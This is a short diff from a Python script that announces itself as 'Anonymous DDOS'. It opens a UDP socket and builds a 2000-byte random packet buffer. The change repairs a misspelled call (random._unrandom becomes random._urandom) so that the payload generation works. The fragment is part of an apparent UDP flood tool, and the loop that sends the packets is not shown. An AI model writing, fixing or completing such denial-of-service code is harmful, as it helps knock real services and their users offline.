@@ -5,7 +5,7 @@ import socket
 import sys
 print("Installation Complete")
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._unrandom(2000)
+bytes = random._urandom(2000)
 os.system("clear")
 ####
 print("Welcome To Anonymous DDOS")
